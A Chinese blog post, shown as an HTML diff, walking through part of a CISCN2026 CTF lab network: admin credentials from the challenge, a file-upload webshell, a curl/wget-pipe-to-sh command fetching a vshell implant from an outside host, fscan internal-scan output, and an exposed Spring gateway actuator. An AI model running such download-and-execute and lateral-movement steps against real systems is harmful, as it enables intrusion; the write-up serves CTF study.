@@ -1,0 +1,1516 @@
+<!DOCTYPE html>
+
+<html class="article-header-style-default">
+<head>
+	
+	<title>CISCN2026部分题目复现 - wo1fyr的随笔</title>
+	<meta charset="utf-8">
+	
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	
+	<meta name="description" content="ISW192.168.7.8出了一个入口机的flag，当时也不知道怎么进入admin.php的，莫名其妙就能进了 &#x27;default_admin&#x27; &#x3D;&gt; [         &#x27;username&#x27; &#x3D;&gt; &#x27;admin&#x27;,         &#x27;password&#x27; &#x3D;&gt; &#x27;Io5gyiIw79bNC&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2026部分题目复现">
+<meta property="og:url" content="http://wo1fyr.github.io/2026/05/09/ciscn2026/index.html">
+<meta property="og:site_name" content="wo1fyr的随笔">
+<meta property="og:description" content="ISW192.168.7.8出了一个入口机的flag，当时也不知道怎么进入admin.php的，莫名其妙就能进了 &#x27;default_admin&#x27; &#x3D;&gt; [         &#x27;username&#x27; &#x3D;&gt; &#x27;admin&#x27;,         &#x27;password&#x27; &#x3D;&gt; &#x27;Io5gyiIw79bNC&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/1.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/111.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/112.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/113.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/2.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/3.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/4.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/11.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/nailong.webp">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/6.jpg">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/5.png">
+<meta property="og:image" content="http://wo1fyr.github.io/img/ciscn2026/7.png">
+<meta property="article:published_time" content="2026-05-08T23:50:00.000Z">
+<meta property="article:modified_time" content="2026-05-28T18:43:17.943Z">
+<meta property="article:author" content="wo1fyr">
+<meta property="article:tag" content="CISCN2026">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://wo1fyr.github.io/img/ciscn2026/1.png">
+
+	<meta name="theme-color" content="#5e72e4">
+	<meta name="theme-color-rgb" content="94,114,228">
+	<meta name="theme-color-origin" content="#5e72e4">
+	<meta name="argon-enable-custom-theme-color" content="true">
+	<meta name="theme-card-radius" content="4">
+	<meta name="theme-version" content="1.0.2">
+	<link rel="icon" href="/assets/img/favicon.ico" type="image/x-icon">
+	<link rel="shortcut icon" href="/assets/img/favicon.ico" type="image/x-icon">
+
+	
+<link rel="stylesheet" href="/assets/argon_css_merged.css">
+
+	
+<link rel="stylesheet" href="/style.css">
+
+	
+<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">
+
+	
+<script src="/assets/argon_js_merged.js"></script>
+
+	
+<script src="/assets/js/argon.min.js"></script>
+
+	
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+	
+
+	<script>
+		var argonConfig = {
+			language: "zh_CN",
+			
+				zoomify: {
+					duration: 200,
+					easing: "cubic-bezier(0.4,0,0,1)",
+					scale: 0.9
+				},
+			
+			pangu: "false",
+			
+				lazyload: {
+					threshold: 800,
+					effect: "fadeIn"
+				},
+			
+			disable_pjax: false,
+			headroom: false
+		}
+	</script>
+	<script>
+		var darkmodeAutoSwitch = "false";
+		function setDarkmode(enable){
+			if (enable == true){
+				$("html").addClass("darkmode");
+			}else{
+				$("html").removeClass("darkmode");
+			}
+			$(window).trigger("scroll");
+		}
+		function toggleDarkmode(){
+			if ($("html").hasClass("darkmode")){
+				setDarkmode(false);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
+			}else{
+				setDarkmode(true);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
+			}
+		}
+		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
+			setDarkmode(true);
+		}
+		function toggleDarkmodeByPrefersColorScheme(media){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			if (media.matches){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		function toggleDarkmodeByTime(){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			let hour = new Date().getHours();
+			if (hour < 7 || hour >= 22){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		if (darkmodeAutoSwitch == 'system'){
+			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
+			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
+			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
+		}
+		if (darkmodeAutoSwitch == 'time'){
+			toggleDarkmodeByTime();
+		}
+		if (darkmodeAutoSwitch == 'alwayson'){
+			setDarkmode(true);
+		}
+
+		function toggleAmoledDarkMode(){
+			$("html").toggleClass("amoled-dark");
+			if ($("html").hasClass("amoled-dark")){
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
+			}else{
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
+			}
+		}
+		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
+			$("html").addClass("amoled-dark");
+		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
+			$("html").removeClass("amoled-dark");
+		}
+	</script>
+	<script>
+		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
+			$("html").addClass("using-safari");
+		}
+	</script>
+
+	
+		
+<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>
+
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+
+<style id="themecolor_css">
+	
+	:root{
+		--themecolor: #5e72e4;
+		--themecolor-dark0: #5368E2;
+		--themecolor-dark: #485FE0;
+		--themecolor-dark2: #324CDD;
+		--themecolor-dark3: #233DD2;
+		--themecolor-light: #8A98EB;
+		--themecolor-rgbstr: 94,114,228;
+		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);
+
+	}
+</style>
+<style id="theme_cardradius_css">
+	:root{
+		--card-radius: 4px;
+	}
+</style>
+
+<body>
+<div id="toolbar">
+	<header class="header-global">
+		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
+			<div class="container">
+				
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon"></span>
+				</button>
+				<a class="navbar-brand" href="/">wo1fyr的随笔</a>
+				<div class="navbar-collapse collapse" id="navbar_global">
+					<div class="navbar-collapse-header">
+						<div class="row">
+							<div class="col-6 collapse-brand"></div>
+							<div class="col-6 collapse-close">
+								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+									<span></span>
+									<span></span>
+								</button>
+							</div>
+						</div>
+					</div>
+					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+					
+							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
+								
+										<li class='nav-item'>
+											<a href='/' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>首页</span>
+											</a>
+											
+										</li>
+									
+										<li class='nav-item'>
+											<a href='/archives' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>归档</span>
+											</a>
+											
+										</li>
+									
+										<li class='nav-item'>
+											<a href='/talk' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>说说</span>
+											</a>
+											
+										</li>
+									
+										<li class='nav-item'>
+											<a href='/categories' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>分类</span>
+											</a>
+											
+										</li>
+									
+							</ul>
+						
+					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+				</div>
+				
+				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
+			</div>
+		</nav>
+	</header>
+</div>
+<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">搜索</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<!-- TODO -->
+<div class="form-group mb-3">
+	<div class="input-group input-group-alternative">
+		<div class="input-group-prepend">
+			<span class="input-group-text"><i class="fa fa-search"></i></span>
+		</div>
+		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
+	</div>
+	<div id="local-search-result"></div>
+</div>
+
+			</div>
+		</div>
+	</div>
+</div>
+<!--Banner-->
+<section id="banner" class="banner section section-lg section-shaped">
+	<div class="shape shape-style-1 shape-primary">
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+	</div>
+
+	
+	<div id="banner_container" class="banner-container container text-center">
+		
+			<div class="banner-title text-white"><span class="banner-title-inner">wo1fyr的随笔</span>
+		
+		</div>
+	</div>
+	
+</section>
+
+
+	<style>
+		#content:before {
+			content: '';
+			display: block;
+			position: fixed;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			z-index: -2;
+			background: url(/assets/img/【哲风壁纸】夏日-大海-海滨.png);
+			background-position: center;
+			background-size: cover;
+			background-repeat: no-repeat;
+			opacity: 1;
+			transition: opacity .5s ease;
+		}
+		html.darkmode #content:before{
+			filter: brightness(0.65);
+		}
+		
+		
+			#banner, #banner .shape {
+				background: transparent !important;
+			}
+		
+	</style>
+
+
+
+
+<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
+	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
+		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
+		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
+	</button>
+	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
+		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
+	</button>
+	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" style='display: none;'  aria-label="Comment" tooltip="评论">
+		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
+	</button>
+	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" style='display: none;'  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
+		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
+	</button>
+	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button"  aria-label="Open Blog Settings Menu" tooltip="设置">
+		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
+	</button>
+	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
+		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
+		<div class="blog-setting-item mt-3">
+			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
+			<div style="flex: 1;"></div>
+			<label id="blog_setting_darkmode_switch" class="custom-toggle">
+				<span class="custom-toggle-slider rounded-circle"></span>
+			</label>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">字体</div>
+			<div>
+				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">阴影</div>
+			<div>
+				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3 mb-3">
+			<div style="flex: 1;">滤镜</div>
+			<div id="blog_setting_filters" class="ml-3">
+				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
+				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
+				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
+				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mb-3">
+			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
+			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
+				<div id="blog_setting_card_radius"></div>
+			</div>
+		</div>
+		
+			<div class="blog-setting-item mt-1 mb-3">
+				<div style="flex: 1;">主题色</div>
+				<div id="theme-color-picker" class="ml-3"></div>
+			</div>
+		
+	</div>
+	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
+		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
+	</button>
+	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
+		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
+		<span id="fabtn_reading_progress_details">0%</span>
+	</button>
+</div>
+
+<div id="content" class="site-content">
+
+
+
+
+
+
+
+
+
+<div class="page-information-card-container">
+	
+</div>
+
+<div id="sidebar_mask"></div>
+<aside id="leftbar" class="leftbar widget-area" role="complementary">
+		
+		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
+			<div class="leftbar-banner card-body">
+				<span class="leftbar-banner-title text-white">wo1fyr的随笔</span>
+				
+				
+			</div>
+			
+			
+				<ul id='leftbar_part1_menu' class='leftbar-menu'>
+					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li><li class='leftbar-menu-item'><a href='/talk'>说说</a></li><li class='leftbar-menu-item'><a href='/categories'>分类</a></li>
+				</ul>
+			
+			<div class="card-body text-center leftbar-search-button">
+				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
+					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
+				</button>
+			</div>
+		</div>
+		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
+			<div id="leftbar_part2_inner" class="card-body">
+				
+				<div class="nav-wrapper" style="padding-top: 5px;">
+	                <ul class="nav nav-pills nav-fill" role="tablist">
+						
+							<li class="nav-item sidebar-tab-switcher">
+								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
+							</li>
+						
+						<li class="nav-item sidebar-tab-switcher">
+							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
+						</li>
+	                </ul>
+				</div>
+				<div>
+					<div class="tab-content" style="padding: 10px 10px 0 10px;">
+						
+							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
+								<div id="leftbar_catalog"></div>
+								<script type="text/javascript">
+									$(function () {
+										$(document).headIndex({
+											articleWrapSelector: '#post_content',
+											indexBoxSelector: '#leftbar_catalog',
+											subItemBoxClass: "index-subItem-box",
+											itemClass: "index-item",
+											linkClass: "index-link",
+											offset: 80,
+										});
+									})
+								</script>
+								
+							</div>
+						
+						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
+							<img id="leftbar_overview_author_image" src="/assets/img/auther.jpg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
+							<h6 id="leftbar_overview_author_name">wo1fyr的随笔</h6>
+							<nav class="site-state">
+								<div class="site-state-item site-state-posts">
+									<a href="/archives">
+										<span class="site-state-item-count">16</span>
+										<span class="site-state-item-name">文章</span>
+									</a>
+								</div>
+								<div class="site-state-item site-state-categories">
+									<a data-toggle="modal" data-target="#blog_categories">
+										<span class="site-state-item-count">5</span>
+										<span class="site-state-item-name">分类</span>
+									</a>
+								</div>      
+								<div class="site-state-item site-state-tags">
+									<a data-toggle="modal" data-target="#blog_tags">
+										<span class="site-state-item-count">23</span>
+										<span class="site-state-item-name">标签</span>
+									</a>
+								</div>
+							</nav>
+							
+									<div class="site-author-links">
+										
+									</div>
+								
+							
+									<div class='site-friend-links'>
+										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
+										<ul class='site-friend-links-ul'>
+											
+												<li class='site-friend-links-item'>
+													<a href='/link' rel='noopener' target='_blank'>友情链接</a>
+												</li>
+											
+												<li class='site-friend-links-item'>
+													<a href='https://github.com/wo1fyr' rel='noopener' target='_blank'>Github</a>
+												</li>
+											
+										</ul>
+									</div>
+								
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+</aside>
+<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">分类</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/categories/CTF/" rel="tag">CTF <span class="tag-num">3</span></a><a class="badge badge-secondary tag" href="/categories/CVE/" rel="tag">CVE <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全 <span class="tag-num">9</span></a><a class="badge badge-secondary tag" href="/categories/tools/" rel="tag">tools <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/categories/%E6%9D%82%E9%A1%B9/" rel="tag">杂项 <span class="tag-num">1</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">标签</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/tags/CISCN2026/" rel="tag">CISCN2026 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/CTF/" rel="tag">CTF <span class="tag-num">3</span></a><a class="badge badge-secondary tag" href="/tags/CTF%E5%88%B7%E9%A2%98/" rel="tag">CTF刷题 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/CTF%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" rel="tag">CTF工具使用 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/CVE%E5%AD%A6%E4%B9%A0/" rel="tag">CVE学习 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/JavaScript/" rel="tag">JavaScript <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/MD5%E7%A2%B0%E6%92%9E/" rel="tag">MD5碰撞 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/PHP/" rel="tag">PHP <span class="tag-num">5</span></a><a class="badge badge-secondary tag" href="/tags/Python/" rel="tag">Python <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/SSTI/" rel="tag">SSTI <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/XSS/" rel="tag">XSS <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/edusrc/" rel="tag">edusrc <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计 <span class="tag-num">3</span></a><a class="badge badge-secondary tag" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">原型链污染 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透 <span class="tag-num">3</span></a><a class="badge badge-secondary tag" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现 <span class="tag-num">3</span></a><a class="badge badge-secondary tag" href="/tags/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/" rel="tag">脚本收集 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E8%87%AA%E5%A2%9E%E5%8E%9F%E7%90%86/" rel="tag">自增原理 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" rel="tag">隧道搭建 <span class="tag-num">2</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<div id="primary" class="content-area">
+	<main id="main" class="site-main" role="main">
+		
+		
+			
+	<article class="post post-full card bg-white shadow-sm border-0 ">
+	<header class="post-header text-center">
+		
+		<a class="post-title" href="/2026/05/09/ciscn2026/">CISCN2026部分题目复现</a>
+		<div class="post-meta">
+			
+						
+						<div class="post-meta-detail post-meta-detail-time">
+							<i class="fa fa-clock-o" aria-hidden="true"></i>
+							<time title="发布于 2026-5-9 7:50:00 | 编辑于 2026-5-29 2:43:17">2026-5-9 7:50
+							</time>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-categories">
+							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
+							<a class="post-meta-detail-catagory-link" href="/categories/CTF/">CTF</a>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa fa-book" aria-hidden="true"></i>
+							<span id="busuanzi_container_page_pv">
+								阅读<span id="busuanzi_value_page_pv"></span>次
+							</span>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa-file-word-o" aria-hidden="true"></i>
+							5.6k 字
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-readingtime">
+							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
+							28 分钟
+						</div>
+					
+		</div>
+		
+	</header>
+
+	<div class="post-content" id="post_content">
+		<h1 id="ISW"><a href="#ISW" class="headerlink" title="ISW"></a>ISW</h1><h2 id="192-168-7-8"><a href="#192-168-7-8" class="headerlink" title="192.168.7.8"></a>192.168.7.8</h2><p>出了一个入口机的flag，当时也不知道怎么进入admin.php的，莫名其妙就能进了</p>
+<pre><code class="hljs php"><span class="hljs-string">&#x27;default_admin&#x27;</span> =&gt; [
+        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,
+        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;Io5gyiIw79bNC&#x27;</span>,
+    ],</code></pre>
+
+<p>预期解法应该是扫描目录得到data.sqlite这个数据库文件拿到管理员帐密</p>
+<p>登陆后就是一个简单的文件上传，蚁剑连接后上线vshell</p>
+<pre><code class="hljs plaintext">(curl -fsSL -m180 http://10.11.116.99:9001/slt||wget -T180 -q
+http://10.11.116.99:9001/slt)|sh</code></pre>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>可以看到根目录下有个f1ag</p>
+<pre><code class="hljs plaintext">cmsapp@dmz-cms:/tmp$ find . -exec cat /f1ag \;
+flag1: flag&#123;faafcf92d6744ba293479c80fd600be8&#125;</code></pre>
+
+<p>上传fscan扫描内网</p>
+<pre><code class="hljs sh">cmsapp@dmz-cms:/tmp$ <span class="hljs-built_in">cat</span> result.txt
+192.168.7.83:8092 open
+192.168.7.8:80 open
+192.168.7.51:80 open
+192.168.7.128:22 open
+192.168.7.51:22 open
+192.168.7.83:22 open
+192.168.7.8:22 open
+192.168.7.13:22 open
+192.168.7.83:21 open
+[*] WebTitle http://192.168.7.8        code:200 len:6510   title:首页 | 华讯内容管理系统
+[*] WebTitle http://192.168.7.51       code:200 len:595    title:Directory listing <span class="hljs-keyword">for</span> /
+[+] InfoScan http://192.168.7.51       [目录遍历] 
+[*] WebTitle http://192.168.7.83:8092  code:404 len:282    title:None
+10.11.136.193:22 open
+10.11.136.195:80 open
+10.11.136.195:22 open
+[*] WebTitle http://10.11.136.195      code:200 len:6510   title:首页 | 华讯内容管理系统</code></pre>
+
+<p>这个192.168.7.8就是入口机，192.168.7.51是一个pwn题目，192.168.7.83是一个springboot，ftp弱密码连接可以拿到一个app.jar，但是比赛时候没分析出来</p>
+<h2 id="192-168-7-83"><a href="#192-168-7-83" class="headerlink" title="192.168.7.83"></a>192.168.7.83</h2><p>Yakit扫描得到ftp弱密码，Xftp连接拿到一个app.jar</p>
+<h3 id="jadx分析"><a href="#jadx分析" class="headerlink" title="jadx分析"></a>jadx分析</h3><p>这是一个基于 <strong>Spring Boot 3.x</strong> 和 <strong>Spring Cloud 2025.x</strong> 的 <strong>API 网关服务</strong></p>
+<p>分析了这么些jar包，习惯性的先找pom.xml和application.yml</p>
+<pre><code class="hljs yml"><span class="hljs-attr">management:</span>
+  <span class="hljs-attr">endpoints:</span>
+    <span class="hljs-attr">web:</span>
+      <span class="hljs-attr">exposure:</span>
+        <span class="hljs-attr">include:</span> <span class="hljs-string">gateway</span>
+  <span class="hljs-attr">endpoint:</span>
+    <span class="hljs-attr">gateway:</span>
+      <span class="hljs-attr">access:</span> <span class="hljs-string">unrestricted</span></code></pre>
+
+<p>注意到这里unrestricted，意味着允许这个端点的全部操作，这就是我们可以利用的点</p>
